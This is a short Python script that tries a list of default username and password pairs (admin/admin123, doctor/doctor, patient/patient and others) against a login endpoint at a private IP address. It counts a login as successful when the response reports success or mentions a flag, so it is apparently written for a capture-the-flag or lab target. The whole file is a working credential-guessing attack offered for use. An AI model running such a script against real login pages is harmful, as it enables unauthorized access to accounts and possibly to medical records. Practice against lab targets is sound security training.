import requests
import json

TARGET_URL = "http://10.0.162.112:5003/login"

CREDENTIALS = [
    ("admin", "admin123"),
    ("admin", "password"),
    ("admin", "123456"),
    ("user", "user"),
    ("test", "test"),
    ("guest", "guest"),
    ("medical", "medical"),
    ("doctor", "doctor"),
    ("patient", "patient")
]

def main():
    headers = {"Content-Type": "application/json"}
    
    for username, password in CREDENTIALS:
        payload = {
            "username": username,
            "password": password
        }
        
        try:
            res = requests.post(TARGET_URL, json=payload, headers=headers, timeout=10)
            
            is_success = False
            
            if res.status_code == 200:
                try:
                    data = res.json()
                    if data.get("success") or data.get("status") == "success" or "flag" in str(data).lower():
                        is_success = True
                except json.JSONDecodeError:
                    if "fail" not in res.text.lower() and "error" not in res.text.lower() and "invalid" not in res.text.lower():
                        is_success = True
                        
            if is_success:
                print(f"[+] Valid credentials found: {username}:{password}")
                print(f"[+] Response: {res.text}")
                return
            else:
                print(f"[-] Failed attempt: {username}:{password} (Status: {res.status_code})")
                
        except requests.RequestException as e:
            print(f"[!] Request error for {username}:{password} - {e}")

if __name__ == "__main__":
    main()